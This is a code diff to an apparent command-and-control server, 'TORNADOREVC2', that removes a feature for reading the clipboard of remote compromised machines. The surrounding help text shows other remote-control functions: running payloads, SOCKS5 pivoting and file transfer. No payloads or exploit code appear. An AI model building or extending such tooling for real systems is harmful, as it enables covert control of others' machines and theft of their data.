@@ -38,7 +38,6 @@ from .constants import (
     XFER_MARK_END,
     XFER_MARK_START,
 )
-from .clipboard import ClipboardManager
 from .export import SessionExporter
 from .payloads import get_payloads
 from .payload_exec import PayloadExecutor
@@ -70,7 +69,6 @@ class TORNADOREVC2:
         self.client_lock = Lock()
         self.transfer = FileTransfer(self)
         self.payload_exec = PayloadExecutor(self)
-        self.clipboard = ClipboardManager(self)
         self.tunnels = TunnelManager(self)
         self.exporter = SessionExporter(self)
         self.registry = SessionRegistry()
@@ -919,10 +917,6 @@ class TORNADOREVC2:
                         if self.payload_exec.handle_command(client_sock, cmd_parts, from_client=True):
                             continue
 
-                    if cmd_lower == 'clipboard':
-                        if self.clipboard.handle_command(client_sock, cmd_parts, from_client=True):
-                            continue
-
                     if cmd_lower in ('socks', 'tunnels'):
                         if self.tunnels.handle_command(client_sock, cmd_parts, from_client=True):
                             continue
@@ -966,9 +960,6 @@ class TORNADOREVC2:
     runps <local.ps1> [--save-output <file>]
     runexe <local.exe> [-- args] [--save-output <file>]
     runelf <local_binary> [-- args] [--save-output <file>]
-
-    {self.colors['green']}CLIPBOARD:{self.colors['end']}
-    clipboard                                 Read remote clipboard text
 
     {self.colors['green']}INTERNAL PIVOTING (SOCKS5):{self.colors['end']}
     socks <listen_port>                               SOCKS5 proxy via session
@@ -1114,18 +1105,6 @@ class TORNADOREVC2:
                         self.payload_exec.handle_command(client_sock, cmd_parts)
                     except ValueError:
                         print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
-                elif cmd_lower == 'clipboard':
-                    if len(cmd_parts) < 2:
-                        print(f"{self.colors['red']}Usage: clipboard <ID>{self.colors['end']}")
-                        continue
-                    try:
-                        client_sock = self._get_client_by_id(int(cmd_parts[1]))
-                        if not client_sock:
-                            print(f"{self.colors['red']}Client #{cmd_parts[1]} not active{self.colors['end']}")
-                            continue
-                        self.clipboard.handle_command(client_sock, ['clipboard'])
-                    except ValueError:
-                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                 elif self.exporter.handle_command(cmd_parts):
                     pass
                 elif self.plugins.handle_command(cmd_parts):
@@ -1203,9 +1182,6 @@ class TORNADOREVC2:
     runps <ID> <local.ps1> [--save-output <file>]
     runexe <ID> <local.exe> [-- args] [--save-output <file>]
     runelf <ID> <local_binary> [-- args] [--save-output <file>]
-
-    {self.colors['green']}CLIPBOARD:{self.colors['end']}
-    clipboard <ID>                          Read remote clipboard text
 
     {self.colors['green']}FILE TRANSFER:{self.colors['end']}
     upload [--resume] <ID> <local> <remote>     Chunked upload with SHA256 verify
